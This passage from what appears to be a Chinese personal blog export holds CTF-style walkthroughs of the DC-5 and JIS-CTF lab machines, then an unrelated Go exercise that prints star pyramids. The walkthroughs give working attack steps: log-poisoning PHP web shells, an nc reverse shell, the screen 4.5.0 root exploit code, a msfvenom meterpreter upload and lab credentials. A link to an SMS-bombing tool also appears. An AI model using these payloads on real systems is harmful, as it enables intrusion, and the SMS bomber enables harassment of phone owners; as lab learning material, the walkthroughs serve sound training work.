<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u http://192.168.245.144/thankyou.php?FUZZ --hw 66</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024135621181-1667183983060.png" alt="image-20221024135621181"></p>
<p>由此可以推出<code>192.168.245.144/thankyou.php?file=footer.php</code>是我们需要的文件包含地址</p>
<p>那么修改footer.php为&#x2F;etc&#x2F;passwd看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024144932957-1667183983060.png" alt="image-20221024144932957"></p>
<p>由于是niginx搭建的网站，大概推测nginx的日志地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024145803116-1667183983061.png" alt="image-20221024145803116"></p>
<p>上面还有<code>wfuzz</code>爆破信息呢！</p>
<p>现在我们打开bp，尝试写入phpinfo()进行探测，看一下是否可以包含成功。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024210159631-1667183983061.png" alt="image-20221024210159631"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET &lt;?php phpinfo();?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.245.144</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>然后点击send，返回一个400报错，我们查看一下<code>http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log</code>发现文件包含成功。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024210334796-1667183983061.png" alt="image-20221024210334796"></p>
<p>我们开始重新改写一句话木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/thankyou.php?file=&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024210750067-1667183983061.png" alt="image-20221024210750067"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /thankyou.php?file=&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.245.144</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>执行返回了200，我们尝试用蚁剑连接,url是一下地址，密码是shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024210959973-1667183983061.png" alt="image-20221024210959973"></p>
<p>连接一句话木马，获得 www-data权限，尝试打开虚拟终端。。。结果发现被拒绝了。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024211229469-1667183983061.png" alt="image-20221024211229469"></p>
<p>推测是eval函数被禁用了。</p>
<p>我们改写一下php一句话木马脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php passthru(<span class="variable">$_GET</span>[<span class="string">&#x27;oo&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>passthru - 执行外部程序并显示原始输出</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /thankyou.php?file=&lt;?php passthru(<span class="variable">$_GET</span>[<span class="string">&#x27;oo&#x27;</span>]);?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.245.144</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-10-24_21-18-07.png" alt="Snipaste_2022-10-24_21-18-07"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024211916162-1667183983062.png" alt="image-20221024211916162"></p>
<p>因为这个函数可以执行外部程序并且显示原始输出，所以可以配合nc反弹shell脚本。</p>
<p>检测函数是否能够执行,url输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log&amp;oo=<span class="built_in">cat</span>%20/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024212723086-1667183983062.png" alt="image-20221024212723086"></p>
<p>完美执行，我们尝试写入nc脚本反弹shell给kali。</p>
<p>kali端命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure>

<p>nc执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">oo=nc kali-ip 8888 -c /bin/bash</span><br></pre></td></tr></table></figure>

<p>url执行命令（将上面命令修改为url识别命令）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.245.144/thankyou.php?file=/var/log/nginx/access.log&amp;oo=nc%20192.168.245.132%208888%20-</span><br><span class="line">c%20/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024213351243-1667183983062.png" alt="image-20221024213351243"></p>
<p>kali收到反弹信息。。。</p>
<p>修改为交互界面的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024213450091-1667183983062.png" alt="image-20221024213450091"></p>
<p>sudo -l 发现没有sudo命令</p>
<p>查找一下suid程序： find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024213538997-1667183983062.png" alt="image-20221024213538997"></p>
<p>在<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 查找一下，发现 &#x2F;bin&#x2F;screen-4.5.0 可利用</p>
<p>我这使用kali查找其漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024214336815-1667183983063.png" alt="image-20221024214336815"></p>
<p>使用第一个脚本，我们查看一下用法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/exploitdb/exploits/linux/local/41154.sh</span><br></pre></td></tr></table></figure>

<p>查看文件可以知道，脚本文件需要分成3个步骤完成。</p>
<p>第一步：将第一部分代码写入libhax.c文件中，再执行相应命令生成libhax.so文件。最后删除libhax.c文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># cat &lt;&lt; EOF &gt; /tmp/libhax.c                            </span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    <span class="built_in">chown</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, 0, 0);</span><br><span class="line">    <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span></span><br><span class="line">/tmp/libhax.c: In <span class="keyword">function</span> ‘dropshell’:</span><br><span class="line">/tmp/libhax.c:7:5: warning: implicit declaration of <span class="keyword">function</span> ‘<span class="built_in">chmod</span>’ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     <span class="built_in">chmod</span>(<span class="string">&quot;/tmp/rootshell&quot;</span>, 04755);</span><br><span class="line">      |     ^~~~~</span><br><span class="line">                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">hsperfdata_root</span><br><span class="line">libhax.c</span><br><span class="line">libhax.so</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># rm -rf /tmp/libhax.c</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024221557692-1667183983063.png" alt="image-20221024221557692"></p>
<p>第二步：将第二部分的代码写入rootshell.c文件并执行命令生成rootshell文件，最后删除rootshell.c文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># gcc -o /tmp/rootshell /tmp/rootshell.c</span></span><br><span class="line">/tmp/rootshell.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">/tmp/rootshell.c:3:5: warning: implicit declaration of <span class="keyword">function</span> ‘setuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    3 |     setuid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:4:5: warning: implicit declaration of <span class="keyword">function</span> ‘setgid’ [-Wimplicit-function-declaration]</span><br><span class="line">    4 |     setgid(0);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:5:5: warning: implicit declaration of <span class="keyword">function</span> ‘seteuid’ [-Wimplicit-function-declaration]</span><br><span class="line">    5 |     seteuid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:6:5: warning: implicit declaration of <span class="keyword">function</span> ‘setegid’ [-Wimplicit-function-declaration]</span><br><span class="line">    6 |     setegid(0);</span><br><span class="line">      |     ^~~~~~~</span><br><span class="line">/tmp/rootshell.c:7:5: warning: implicit declaration of <span class="keyword">function</span> ‘execvp’ [-Wimplicit-function-declaration]</span><br><span class="line">    7 |     execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">/tmp/rootshell.c:7:5: warning: too many arguments to built-in <span class="keyword">function</span> ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]</span><br><span class="line">                                                                                                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─<span class="comment"># rm -f /tmp/rootshell.c</span></span><br><span class="line">                             </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024222021184-1667183983063.png" alt="image-20221024222021184"></p>
<p>第三步：将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入<code>#!/bin/bash</code>表示执行环境。最后保存是需要输入<code>:set ff=unix</code>是为了防止脚本的格式错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell         </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024222532234-1667183983063.png" alt="image-20221024222532234"></p>
<p>完成3个步骤后之间把三个文件上传至靶机的&#x2F;tmp文件下，然后执行.&#x2F;dc5即可提权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -r kali@192.168.245.132:/tmp/dc5/* /tmp/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024225619939-1667183983063.png" alt="image-20221024225619939"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#文件授权</span></span><br><span class="line">www-data@dc-5:/tmp$ <span class="built_in">chmod</span> 777 dc5.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 exp.sh</span><br><span class="line">www-data@dc-5:/tmp$ <span class="built_in">chmod</span> 777 libhax.so</span><br><span class="line"><span class="built_in">chmod</span> 777 libhax.so</span><br><span class="line">www-data@dc-5:/tmp$ <span class="built_in">chmod</span> 777 rootshell</span><br><span class="line"><span class="built_in">chmod</span> 777 rootshell</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024231657266-1667183983063.png" alt="image-20221024231657266"></p>
<p>提权不了，全剧终。。。</p>
<h3 id="JIS-CTF"><a href="#JIS-CTF" class="headerlink" title="JIS-CTF"></a>JIS-CTF</h3><p>靶机文件下载好之后，导入虚拟机。<br>不过这个靶机有点小问题，一开始网卡起不来，上网找了找解决方法。<br>解决方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 账号口令 technawi - 3vilH@ksor</span></span><br><span class="line"><span class="comment"># 启用网卡</span></span><br><span class="line">sudo ifconfig ens33 up </span><br><span class="line"><span class="comment"># 分配IP</span></span><br><span class="line">sudo dhclient</span><br><span class="line"><span class="comment"># 在/etc/network/interfaces文件添加相关信息</span></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br></pre></td></tr></table></figure>

<p>我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205181026360.png" alt="image-20221205181026360"></p>
<p>扫描端口和服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sT -A 192.168.241.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205181642408.png" alt="image-20221205181642408"></p>
<p>尝试访问80端口</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205181918331.png" alt="image-20221205181918331"></p>
<p>我们启动目录扫描器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.241.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205182219730.png" alt="image-20221205182219730"></p>
<p>然后配合</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -h http://192.168.241.129</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205194835809.png" alt="image-20221205194835809"></p>
<p>然后再看一眼<code>robots.txt</code></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205183041664.png" alt="image-20221205183041664"></p>
<p>然后一一查看网址和源代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.241.129/flag.txt</span><br></pre></td></tr></table></figure>

<p>正常</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205182529927.png" alt="image-20221205182529927"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.241.129/flag</span><br></pre></td></tr></table></figure>

<p>第一个flag出来了</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205183226044.png" alt="image-20221205183226044"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.241.129/admin_area/</span><br></pre></td></tr></table></figure>

<p>额，第二个flag出来了</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205182632497.png" alt="image-20221205182632497"></p>
<p>发现第二个flag的同时，我们还找到了用户和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username : admin</span><br><span class="line">password : 3v1l_H@ck3r</span><br></pre></td></tr></table></figure>

<p>我们登录该账号密码发现是个上传文件的页面</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205183513015.png" alt="image-20221205183513015"></p>
<p>kali端生成一个监听木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p  php/meterpreter/reverse_tcp  lhost=192.168.241.128 lport=8888 -f raw -o hacker.php</span><br></pre></td></tr></table></figure>

<p>将监听木马上传</p>
<p>kali端开启监听端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.241.128</span><br><span class="line"><span class="built_in">set</span> LPORT 8888</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>BP放行数据，没有什么异端返回</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205190009628.png" alt="image-20221205190009628"></p>
<p>我们并不知道上传的文件放在哪里，结合上面的目录扫描中有一个奇怪的目录<code>uploaded_files</code>，试着访问<code>http://192.168.241.129/uploaded_files/hacker.php</code>，访问成功，说明上传的文件是放在<code>uploaded_files</code>这个文件夹里面的。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205190356946.png" alt="image-20221205190356946"></p>
<p>kali返回连接成功信息</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205191113963.png" alt="image-20221205191113963"></p>
<p>kali获取shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span> hint.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205191849216.png" alt="image-20221205191849216"></p>
<p>拿到第三个flag并且提示我们要找到technawi的密码才能查看flag.txt，改密码放在一个隐秘的地方。</p>
<p>寻找用户名为technawi并且我们有权限访问的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user technawi |grep -v <span class="string">&quot;Permission&quot;</span> &gt;1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205192229426.png" alt="image-20221205192229426"></p>
<p>第四个flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205193201487.png" alt="image-20221205193201487"></p>
<p>我们还拿到了用户账号和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br></pre></td></tr></table></figure>

<p>第五flag到手</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221205193743545.png" alt="image-20221205193743545"></p>
<h2 id="移动手机"><a href="#移动手机" class="headerlink" title="移动手机"></a>移动手机</h2><h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h3><p><a href="https://github.com/OpenEthan/SMSBoom">SMSBoom</a></p>
]]></content>
      <categories>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>编程案例</title>
    <url>/2022/11/28/%E7%BC%96%E7%A8%8B%E6%A1%88%E4%BE%8B/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="编程案例"><a href="#编程案例" class="headerlink" title="编程案例"></a>编程案例</h1><h2 id="多重循环控制-for"><a href="#多重循环控制-for" class="headerlink" title="多重循环控制-for"></a>多重循环控制-for</h2><p><strong>编写一个程序，可以接收一个整数，表示层数，打印出金字塔。</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">  *</span><br><span class="line"> ***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编程思路</span></span><br><span class="line"><span class="comment">// 1.打印一个矩形</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	***</span></span><br><span class="line"><span class="comment">	***</span></span><br><span class="line"><span class="comment">	***</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">3</span>; j++ &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/28/%E7%BC%96%E7%A8%8B%E6%A1%88%E4%BE%8B/image-20221128165532356.png" alt="image-20221128165532356"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.打印半个金字塔</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*   1 个 *</span></span><br><span class="line"><span class="comment">**  2 个 *</span></span><br><span class="line"><span class="comment">*** 3 个 *</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= i; j++ &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/28/%E7%BC%96%E7%A8%8B%E6%A1%88%E4%BE%8B/image-20221128165738560.png" alt="image-20221128165738560"></p>
<p><strong>但是这个每层的*数目不对</strong></p>
<p><strong>应该是第一层一个，第二层三个，第三层五个，第n层2n-1个。</strong></p>
<p><strong>所以</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.打印半个金字塔</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*   1 个 *</span></span><br><span class="line"><span class="comment">***  3 个 *</span></span><br><span class="line"><span class="comment">***** 5 个 *</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">2</span>*i<span class="number">-1</span>; j++ &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/28/%E7%BC%96%E7%A8%8B%E6%A1%88%E4%BE%8B/image-20221128170735903.png" alt="image-20221128170735903"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.打印个金字塔</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  *   1 个 *    规律：2 * 层数 - 1 空格2 空格规律：总层数-当前层数</span></span><br><span class="line"><span class="comment"> ***  3 个 *    规律：2 * 层数 - 1 空格1</span></span><br><span class="line"><span class="comment">***** 5 个 *    规律：2 * 层数 - 1 空格0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这里使用k提前打印空格打印空格</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> k:= <span class="number">1</span>; k &lt;= <span class="number">3</span> - i;k++&#123;</span><br><span class="line">            fmt.Print(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">2</span>*i<span class="number">-1</span>; j++ &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/28/%E7%BC%96%E7%A8%8B%E6%A1%88%E4%BE%8B/image-20221128171618471.png" alt="image-20221128171618471"></p>
<p><strong>再修改题目，将层数改成一个变量。</strong></p>
